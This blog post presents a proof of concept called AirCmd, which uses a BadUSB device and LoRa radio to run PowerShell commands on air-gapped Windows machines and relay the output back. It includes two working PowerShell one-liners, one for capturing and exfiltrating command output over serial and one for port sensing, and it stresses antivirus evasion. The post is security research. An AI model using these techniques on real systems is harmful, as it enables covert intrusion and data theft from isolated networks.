---
title: "A Proof of Concept for Setting Up a Networkless Shell"
date: 2023-10-14 06:40:55 +0800
tags: [AirCmd, Proof of Concept (PoC), networkless, shell]
---

A shell, in computing, refers to a user interface that provides access to an operating system's services. It acts as an intermediary between the user and the operating system, allowing the user to execute commands, run scripts, and manage files and processes. Shells can be graphical (GUI) or command-line (CLI) based, with the latter being text-driven, where users input commands in text form and receive text responses. In a cybersecurity context, a shell refers to a command interface that attackers establish on a compromised system to remotely execute commands and control the system, often achieved through scripts or programs designed to exploit vulnerabilities in the target system. When discussing shells in the context of network security, two common types are mentioned: bind shells and reverse shells.

Establishing a shell (both bind shell and reverse shell) necessitates a network connection between the attacker's system and the target system. This network connection enables the transmission of commands and the retrieval of responses, making control and interaction with the remote system possible. However, in the case of air-gapped networks and isolated computing systems, establishing such a network connection is extremely challenging, almost reaching the realm of impossibility, due to the inherent design of these setups to remain disconnected from other networks as a security measure. The fundamental requirement of a network connection for establishing a shell presents a nearly insurmountable hurdle in the context of air-gapped networks and isolated computing systems.

## AirCmd

AirCmd (pronounced "air command") was conceived as a set of hardware and software toolkits that enable a penetration tester to set up a connectionless, networkless shell targeting an air-gapped network/isolated computing system. AirCmd allows a penetration tester to enjoy a bidirectional, shell-like command and control interface over LoRa. Given the long-range capabilities of LoRa, the penetration tester could be as far away as 5 km in urban areas, and up to 15 kilometers or more in rural areas (whithin line of sight) from the target. AirCmd doesn't introduce any malware or malicious code into the target system, allowing it to evade standard anti-virus software and operate stealthily. AirCmd essentially operates as a "remote keyboard", typing and executing commands on our behalf, albeit from a considerable distance.

This proof of concept was conceived with several assumptions in mind:

1. You have physical access to a computing device within the air-gapped network or isolated computing system.
2. The computing device has a USB port that allows for the connection of peripherals via USB.
3. The facility housing the air-gapped network or isolated computing system is not radio-hardened.
4. PowerShell is available and usable on the target device.

AirCmd is designed to allow you to input commands on your device seamlessly. Once a command is entered, the system promptly transmits it via LoRa to the transceiver hardware connected to the USB port of the target machine. The hardware then efficiently executes the transmitted command through PowerShell on the target machine. Following this execution, the output generated from the command is captured and swiftly transmitted back over LoRa to the transceiver hardware on your device. This mechanism empowers AirCmd to facilitate the remote execution of commands without the need for a network connection, thereby providing a secure, isolated layer of control over the targeted machine.

![img](/assets/img/aircmd-arch.png)
_Process flow of AirCmd Ax and Tx_

AirCmd consists of two segments: the attacker side, dubbed AirCmd Ax, and the target side, referred to as AirCmd Tx. The former houses two primary components: the AirCmd Shell and the AirCmd Ax transceiver. For this proof of concept, I utilized the LILYGO® LoRa32 V2.1_1.6. On the other hand, AirCmd Tx includes an AirCmd Tx transceiver, which integrates a Diymore BEETLE BadUSB Micro ATMEGA32U4-AU Development Expansion Module Board alongside an RFM95W-915S2 LoRa module. This segment also employs a PowerShell interface, which is instrumental for port sensing and command execution.

### AirCmd Shell

![img](/assets/img/aircmd-shell.png)
_The AirCmd Shell_

The AirCmd Shell is essentially a Python script that facilitates a connection for the attacker to the AirCmd Ax transceiver via USB serial. Upon issuing a command within the AirCmd Shell, the script encodes the command into UTF-8 format and transmits the data to the USB port to which the AirCmd Ax transceiver is connected. It then awaits a response from the AirCmd Ax transceiver, which is triggered upon receiving a transmission from the AirCmd Tx transceiver.

### AirCmd Ax Transceiver

![img](/assets/img/aircmd-hardware.png)
_AirCmd Ax and Tx Transceiver Hardware_

The AirCmd Ax transceiver monitors the USB port it's connected to for serial data. Upon receiving the data, it transmits it to the AirCmd Tx transceiver via LoRa. Following this, it awaits a response from the AirCmd Tx transceiver. Once a response is received, it relays this data back to the AirCmd Shell via the serial connection.

### AirCmd Tx Transceiver

The AirCmd Tx transceiver is the most crucial component of AirCmd. It acts as a gateway for receiving the payload, injecting it into the target via PowerShell, and retrieving the data from the interface before transmitting it to the AirCmd Ax transceiver. 

Injecting and executing a PowerShell payload on the target device is straightforward and can be easily accomplished using Arduino's Keyboard library. However, our objective extends beyond mere execution; we aim to execute the command and retrieve its output. For instance, if we wish to view the contents of a file, merely executing the command wouldn't suffice. Although the command will display the file's contents, there isn't a direct method to view these contents via the AirCmd Shell. Therefore, we employ a series of PowerShell commands to execute the original command, pipe its output, consolidate the multiple lines of output into a single line separated by a designated separator, and then transmit this data to the serial port to which our AirCmd Tx transceiver is connected.

```powershell
$lines = [CMD] | % { $_.ToString() }; $joinedLines = $lines -join '?'; $port = new-Object System.IO.Ports.SerialPort [PORT], 9600, None, 8, One; $port.Open(); $port.WriteLine($joinedLines); $port.Close();
```

The command `[CMD]` is issued within the AirCmd Shell and is set to execute, with its output being directed to the serial `[PORT]` to which the AirCmd Tx transceiver is connected. However, a question arises: how does the AirCmd Tx transceiver discern the specific `[PORT]` to which it's connected? To address this, we employ a series of PowerShell commands designed for port sensing.

```powershell
Get-WmiObject -Class Win32_SerialPort | % {if ($_.Description -match 'Arduino') {iex "mode $($_.DeviceID): baud=9600 parity=n data=8 stop=1"; $port = new-Object System.IO.Ports.SerialPort $_.DeviceID,9600,None,8,One; $port.Open(); $port.WriteLine($_.DeviceID); $port.Close()}}
```

Therefore, the moment the AirCmd Tx transceiver is connected to the target device, it opens a PowerShell window, executes the port sensing commands, and stores the port information in memory. This stored information can later be used to redirect and write back the output of the PowerShell commands that were executed.

### PowerShell

The PowerShell program executed by the AirCmd Tx transceiver stands as a highly versatile and powerful tool, serving a multitude of purposes across system administration, automation, and scripting tasks. An attacker may leverage PowerShell to bypass security measures like antivirus software due to its inherent trust within Windows environments. Its capability to execute code and scripts can be used to run malicious code or establish persistence on a system. Moreover, the extensive system access it offers can be exploited to extract sensitive data or manipulate system settings. The attacker might also harness PowerShell's remote management features to control the compromised system or spread malware across a network. The combination of PowerShell's versatility and power, along with its legitimate status, renders it a notable vector for attackers seeking to exploit vulnerabilities and exfiltrate data from the target system.

## Demo

{% include embed/youtube.html id='lDhl9ivTlL0' %}

The presented proof of concept has its limitations, reflecting certain imperfections inherent in the implementation phase. A more refined design could potentially address these limitations. One notable issue is AirCmd's susceptibility to the constraints posed by LoRa technology, particularly in terms of data packet size and throughput, given its reliance on LoRa for data transfers. However, it's crucial to remember the primary objective behind the creation of AirCmd: to demonstrate the feasibility of establishing networkless shells, and to shed light on how air-gapped systems might be compromised. Through this endeavor, I aimed to provide a tangible illustration of how these security challenges can manifest, while also offering a platform for exploring potential solutions or further investigations into overcoming the identified limitations.

The souce code for this proof of concept is available [here](https://github.com/Malware-Mystic/AirCmd/).